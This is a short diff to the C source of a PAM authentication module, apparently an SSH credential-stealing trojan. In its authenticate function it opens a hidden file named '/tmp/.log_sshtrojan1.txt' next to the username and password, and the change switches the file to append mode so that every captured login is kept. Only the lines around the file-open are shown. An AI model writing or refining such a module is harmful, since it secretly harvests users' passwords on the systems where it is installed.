@@ -32,7 +32,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
 	if (!pword || !uname) {
 		return PAM_AUTHINFO_UNAVAIL;
 	}
-	FILE *f = fopen("/tmp/.log_sshtrojan1.txt", "w");
+	FILE *f = fopen("/tmp/.log_sshtrojan1.txt", "a+");
 	if (f == NULL)
 	{
 		exit(1);
